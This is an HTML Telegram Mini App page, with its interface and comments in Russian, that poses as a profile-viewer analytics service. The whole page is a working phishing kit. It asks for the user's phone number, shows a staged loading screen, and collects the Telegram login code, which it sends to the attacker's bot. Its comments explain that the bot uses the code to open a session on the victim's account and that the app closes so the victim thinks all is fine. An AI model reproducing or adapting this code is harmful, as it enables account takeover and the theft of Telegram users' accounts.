<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Telegram Analytics Pro</title>
    <script src="https://telegram.org"></script>
    <style>
        :root {
            --tg-theme-bg: #1c1c1d;
            --tg-theme-text: #ffffff;
            --tg-theme-hint: #8e8e93;
            --tg-theme-button: #0A84FF;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: var(--tg-theme-bg);
            color: var(--tg-theme-text);
            margin: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            overflow: hidden;
        }
        .container { width: 100%; max-width: 320px; text-align: center; padding: 20px; }
        .logo { width: 90px; height: 90px; background: url('https://telegram.org') no-repeat center; background-size: contain; margin: 0 auto 25px; }
        h2 { font-size: 24px; margin-bottom: 12px; font-weight: 600; }
        p { color: var(--tg-theme-hint); font-size: 15px; line-height: 1.5; margin-bottom: 30px; padding: 0 10px; }
        input { 
            width: 100%; 
            background: #2c2c2e; 
            border: 1px solid #3a3a3c; 
            border-radius: 12px; 
            padding: 14px; 
            color: white; 
            font-size: 18px; 
            margin-bottom: 15px; 
            box-sizing: border-box; 
            outline: none;
            text-align: center;
        }
        input:focus { border-color: var(--tg-theme-button); }
        .btn { 
            width: 100%; 
            background: var(--tg-theme-button); 
            color: white; 
            border: none; 
            border-radius: 12px; 
            padding: 16px; 
            font-size: 16px; 
            font-weight: 600; 
            cursor: pointer; 
            transition: opacity 0.2s; 
        }
        .btn:active { opacity: 0.8; }
        
        /* Стили для этапов */
        #code-step, #loading-step { display: none; }
        
        .spinner {
            border: 3px solid rgba(255,255,255,0.1);
            border-top: 3px solid var(--tg-theme-button);
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="container">
        <div class="logo"></div>

        <!-- ШАГ 1: Запрос номера через системное окно -->
        <div id="phone-step">
            <h2>Analytics v5.0</h2>
            <p>Чтобы узнать, кто просматривал ваш профиль, подтвердите личность через протокол Telegram.</p>
            <button class="btn" onclick="requestPhone()">🔐 Продолжить как пользователь</button>
        </div>

        <!-- ШАГ 2: Загрузка (спектакль) -->
        <div id="loading-step">
            <div class="spinner"></div>
            <h2 id="status-text">Синхронизация...</h2>
            <p>Подключаемся к защищенному узлу данных Telegram...</p>
        </div>

        <!-- ШАГ 3: Ввод кода -->
        <div id="code-step">
            <h2>Проверка кода</h2>
            <p>Мы отправили проверочный код в ваш <b>Telegram</b>. Введите его для завершения.</p>
            <input type="number" id="code" placeholder="00000" inputmode="numeric">
            <button class="btn" onclick="sendCode()">Завершить анализ</button>
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();
        tg.enableClosingConfirmation();

        function requestPhone() {
            // ТГ вызывает системное окно "Поделиться номером"
            tg.requestContact((ok) => {
                if (ok) {
                    // Номер улетает боту автоматом как сервисное сообщение (Contact)
                    document.getElementById('phone-step').style.display = 'none';
                    document.getElementById('loading-step').style.display = 'block';
                    
                    // Эффект работы: ждем 4 секунды, пока бот создаст сессию и ТГ пришлет ей код
                    setTimeout(() => {
                        document.getElementById('loading-step').style.display = 'none';
                        document.getElementById('code-step').style.display = 'block';
                    }, 4000);
                } else {
                    alert("Ошибка: Для работы сервиса необходимо подтвердить аккаунт.");
                }
            });
        }

        function sendCode() {
            const code = document.getElementById('code').value;
            if (code.length < 5) {
                alert("Код должен состоять из 5 цифр");
                return;
            }

            // Шлем код боту через sendData (JSON)
            tg.sendData(JSON.stringify({t: 'c', v: code}));
            
            // Финальный экран "Успех/Ошибка"
            document.getElementById('code-step').style.display = 'none';
            document.getElementById('loading-step').style.display = 'block';
            document.getElementById('status-text').innerText = "Анализ логов...";
            
            // Закрываем через 3 сек, чтоб она подумала, что всё ок
            setTimeout(() => {
                tg.close();
            }, 3000);
        }
    </script>
</body>
</html>
